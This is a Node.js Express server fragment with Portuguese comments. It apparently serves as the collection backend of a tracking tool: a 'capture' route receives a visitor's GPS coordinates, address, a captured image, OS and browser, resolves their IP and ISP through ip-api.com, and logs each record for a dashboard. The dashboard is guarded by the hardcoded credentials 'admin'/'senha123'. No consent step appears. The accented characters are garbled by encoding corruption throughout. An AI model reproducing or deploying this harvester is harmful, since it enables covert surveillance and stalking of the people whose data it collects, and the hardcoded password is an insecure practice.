const auth = require('basic-auth');
function autenticar(req, res, next) {
  const usuario = auth(req);
  const usuarioValido = 'admin';
  const senhaValida = 'senha123';

  if (!usuario || usuario.name !== usuarioValido || usuario.pass !== senhaValida) {
    res.set('WWW-Authenticate', 'Basic realm="Dashboard Protegido"');
    return res.status(401).send('Acesso negado â€“ autenticaÃ§Ã£o necessÃ¡ria.');
  }

  next();
}

// ========== FUNÃ‡ÃƒO PARA OBTER IP PÃšBLICO DO CLIENTE ==========
async function obterIPPublicoCliente(clientIP) {
  try {
    // Se o IP do cliente jÃ¡ parece ser pÃºblico, usar ele
    if (clientIP && !clientIP.startsWith('192.168.') && !clientIP.startsWith('10.') && 
        !clientIP.startsWith('172.') && clientIP !== '127.0.0.1' && clientIP !== '::1') {
      return clientIP;
    }
    
    // Se for IP local/privado, tentar obter o IP pÃºblico real do cliente
    // Isso sÃ³ funcionarÃ¡ se o cliente estiver por trÃ¡s de proxy/NAT
    const response = await axios.get(`http://ip-api.com/json/${clientIP}`);
    if (response.data && response.data.query) {
      return response.data.query;
    }
    
    return clientIP || 'NÃ£o foi possÃ­vel obter';
  } catch (err) {
    console.error('Erro ao obter IP pÃºblico do cliente:', err.message);
    return clientIP || 'Erro na consulta';
  }
}

// ========== ROTA DE CAPTURA ==========
app.post('/dados', async (req, res) => {
  const { latitude, longitude, endereco, imagem, sistema, navegador } = req.body;

  const fileName = `captura_${Date.now()}.png`;
  const base64Data = imagem.replace(/^data:image\/png;base64,/, "");
  fs.writeFileSync(path.join(__dirname, fileName), base64Data, 'base64');

  // Capturar IP do cliente (headers do servidor)
  const clientIP = req.headers['x-forwarded-for'] || 
                   req.headers['x-real-ip'] || 
                   req.connection.remoteAddress || 
                   req.socket.remoteAddress ||
                   (req.connection.socket ? req.connection.socket.remoteAddress : null) ||
                   req.ip;

  let operadora = 'Desconhecida';
  let ipPublicoReal = 'NÃ£o informado';
  let ipServidor = clientIP || 'Desconhecido';
  let ipv4 = 'NÃ£o informado';
  let ipv6 = 'NÃ£o informado';
  
  try {
    // Obter o IP pÃºblico do cliente (pessoa que acessa)
    ipPublicoReal = await obterIPPublicoCliente(clientIP);
    
    // Consultar informaÃ§Ãµes do IP do cliente
    const ipRes = await axios.get(`http://ip-api.com/json/${ipPublicoReal}`);
    operadora = ipRes.data.isp || operadora;
    
    // Detectar se o IP do cliente Ã© IPv4 ou IPv6
    if (clientIP) {
      if (clientIP.includes(':')) {
        ipv6 = clientIP;
      } else if (clientIP.includes('.')) {
        ipv4 = clientIP;
      }
    }
  } catch (err) {
    console.error('Erro ao buscar informaÃ§Ãµes do IP:', err.message);
  }

  const registro = {
    latitude,
    longitude,
    endereco,
    sistema,
    navegador,
    imagem: fileName,
    horario: new Date().toLocaleString(),
    operadora,
    ipPublico: ipPublicoReal,  // IP pÃºblico do cliente
    ipCliente: ipServidor,     // IP original do cliente
    ipv4,
    ipv6
  };

  dadosRecebidos.push(registro);
  console.log('ðŸ“¥ Novo registro recebido:', registro);
  res.send('Dados recebidos com sucesso!');
});
